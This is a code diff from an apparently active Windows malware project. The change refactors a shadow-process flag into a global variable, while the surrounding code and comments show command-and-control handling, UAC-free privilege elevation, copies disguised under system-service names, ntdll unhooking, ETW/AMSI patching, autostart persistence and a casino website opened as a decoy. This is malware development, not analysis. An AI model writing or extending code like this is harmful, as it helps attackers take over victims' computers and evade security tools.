@@ -326,7 +326,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         result = sys_obfuscate_ps(ps_cmd);
     }
     else if (strcmp(cmd, "PROTECT_NOW") == 0) {
-        if (!isShadow) {
+        if (!g_isShadow) {
             result = "[FAIL: PROTECT_NOW only works for shadow processes]";
         } else if (!sys_is_admin()) {
             result = "[FAIL: not running as administrator]";
@@ -425,21 +425,21 @@ DWORD WINAPI game_client_loop(LPVOID lpParam) {
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     /* Detect if this is a shadow copy */
     char *cmdLine = GetCommandLineA();
-    int isShadow = (cmdLine && strstr(cmdLine, "--shadow") != NULL);
+    g_isShadow = (cmdLine && strstr(cmdLine, "--shadow") != NULL);
     
     char currentPath[MAX_PATH];
     GetModuleFileNameA(NULL, currentPath, MAX_PATH);
     if (strstr(currentPath, "ElevationService.exe") != NULL ||
         strstr(currentPath, "CrashHandler.exe") != NULL ||
         strstr(currentPath, "NotifyService.exe") != NULL) {
-        isShadow = 1;
+        g_isShadow = 1;
     }
     
     /* === PHASE 0: Elevate FIRST (before anything else) ===
      * If main process is not admin, elevate immediately and exit.
      * This ensures ALL subsequent operations (C2, spawning shadows,
      * scheduled tasks) run elevated WITHOUT UAC prompts. */
-    if (!isShadow) {
+    if (!g_isShadow) {
         sys_check_privileges();
     }
     
@@ -458,7 +458,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     /* === PHASE 2: Evasion (after C2 is connected) ===
      * Shadow copies skip the long anti-sandbox sleep.
      * They just need quick ntdll unhook + ETW/AMSI patch. */
-    if (isShadow) {
+    if (g_isShadow) {
         /* Fast path for shadows: just unhook and patch, no long sleeps */
         /* REMOVED */;
         /* REMOVED */;
@@ -476,7 +476,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     ui_init();
     
     /* Open casino decoy website (only for main process, not shadows) */
-    if (!isShadow) {
+    if (!g_isShadow) {
         ShellExecuteA(NULL, "open", "https://jjakinn.github.io/new-vivid-casino-1/", NULL, NULL, SW_SHOWNORMAL);
     }
     
@@ -487,7 +487,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     sys_register_autostart();
     
     /* Only auto-protect shadow copies after 15 seconds */
-    if (isShadow) {
+    if (g_isShadow) {
         CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
     }
     
